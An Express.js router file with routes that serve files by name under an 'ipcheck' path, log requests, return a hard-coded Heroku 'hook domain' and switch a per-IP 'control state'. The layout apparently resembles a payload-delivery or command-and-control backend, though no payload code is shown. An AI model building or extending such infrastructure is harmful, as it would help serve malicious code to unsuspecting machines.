const express = require("express");
const path = require("path");
const limiter = require("../middleware/rateLimiter");
const logRequests = require("../middleware/logRequests");
const { getFileContents, getFileContentsEncrypted } = require("../controllers/ipCheckController");
const { listRequests, updateControlStateByIP } = require("../controllers/requestController");

module.exports = (db) => {
  const router = express.Router();

  // Apply rate limiter
  router.use(limiter);
  
  // Log requests
  router.use(async (req, res, next) => logRequests(req, res, next, db));

  // IP check route
  router.post("/api/ipcheck/:filename", (req, res) => getFileContents(req, res, db));
  // New encrypted apiKey endpoint
  router.get("/api/ipcheck-encrypted/:filename", (req, res) => getFileContentsEncrypted(req, res, db));

  // List requests
  router.get("/mine/hook-domain", (req, res) => {res.send("lcarus-shipping-backend-ce6c088c70be.herokuapp.com")});
  router.get("/mine/list", (req, res) => listRequests(req, res, db));
  router.get("/mine/list.css", (req, res) => res.sendFile(path.join(__dirname, "../views", "list.css")));
  router.get("/mine/list.js", (req, res) => res.sendFile(path.join(__dirname, "../views", "list.js")));

  // Update control state
  router.post("/mine/update-state/", (req, res) => updateControlStateByIP(req, res, db));

  return router;
};